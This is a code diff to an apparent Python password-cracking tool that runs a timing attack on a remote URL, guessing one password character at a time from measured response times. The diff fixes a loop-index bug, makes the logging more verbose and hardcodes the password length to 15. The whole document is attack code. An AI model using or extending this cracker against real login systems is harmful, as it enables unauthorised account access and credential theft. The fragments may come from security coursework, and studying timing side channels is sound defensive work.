@@ -196,11 +196,11 @@ def crack_password_thread(url, ch, iterations: int=Configurations.attempts, logg
         end = time()
 
         # insert to dict
-        total_iterations_time += end - start
+        total_iterations_time += (end - start)
         if result.read() == b'1':
             raise ValueError(f"FoundPassWord! 'url'.")
-        if i % 3 == 0:
-            write_log(logger, f"[crack password thread][{ch}][iteration {i}] result time: {total_iterations_time}:")
+        if i % 1 == 0:
+            write_log(logger, f"[crack password thread][{ch}][iteration {i}] result time: {total_iterations_time}  -  {url}")
 
     return ch, total_iterations_time
 
@@ -227,8 +227,8 @@ def crack_password(password_size: int, start_url: str = "", end_url: str = "", l
 
         letters_dict = {}
 
-        for _ in Configurations.characters:
-            result = future_results[i].result()
+        for j in range(len(future_results)):
+            result = future_results[j].result()
             letters_dict[result[0]] = result[1]
 
         minimum_key = min(letters_dict, key=letters_dict.get)
@@ -255,7 +255,8 @@ def timing_attack(start_url: str = "", end_url: str = "",
     """
     logger = set_logger(Configurations.result_path, "crack password")
 
-    size = check_password_size(start_url, end_url, password_size, logger)
+    size = 15
+    # size = check_password_size(start_url, end_url, password_size, logger)
 
     if size is None:
         return None
